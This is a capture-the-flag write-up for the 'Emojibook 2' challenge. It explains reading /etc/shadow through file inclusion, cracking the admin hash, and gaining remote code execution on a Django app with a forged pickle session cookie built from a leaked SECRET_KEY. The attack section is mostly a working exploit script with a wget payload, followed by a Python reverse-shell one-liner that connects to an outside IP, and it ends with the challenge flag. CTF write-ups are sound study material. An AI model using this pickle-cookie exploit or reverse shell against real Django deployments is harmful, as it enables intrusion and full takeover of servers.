# Emojibook 2

We try to read the flag at the usual location using the same exploit
as in emojibook 1, but fail with a 500 error. Reading
/etc/shadow however works. And we see there's an admin user
and a hash, so hashcat go brrr and gives us the password 999999
after a few seconds of running. So the user is just there
to restrict the web user to read the flag file (But we can
read the shadow file lmao).

And then we read a few more files, got our fingers on the 
secret key to encrypt cookies and saw that pickle was
enabled...

So let's just do a remote code execution using pickle:

```py
import os
import socket
import base64
import subprocess

from django.core.signing import TimestampSigner, b64_encode
from django.utils.encoding import force_bytes
import requests
import random, string

try:
   import cPickle as pickle
except:
   import pickle


SECRET_KEY = 'wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7"(S3xv,{sp)Xaqg?2pj2=hFCgN"CR"UPn4'

def rotten_cookie(payload):
  key = force_bytes(SECRET_KEY)
  salt = 'django.contrib.sessions.backends.signed_cookies'
  base64d = base64.b64encode(payload).decode()
  return TimestampSigner(key, salt=salt).sign(base64d)

class Shell_code(object):
    def __reduce__(self):
        return (os.system,('/usr/bin/wget <your_ip/reqbin_here>',))

pickled_obj= pickle.dumps(Shell_code())
cookie = rotten_cookie(pickled_obj)
print(cookie)
requests.get('http://193.57.159.27:42585/admin/', cookies=dict(sessionid=cookie))
```

and then a reverse shell using python:

`return (os.system,('/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("84.72.193.30",1236));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',))`

(Thanks to my teammate spawning the shell on my server :P)

Now just enter password, read flag, profit

`ractf{dj4ng0_lfi_rce_not_unintended}`
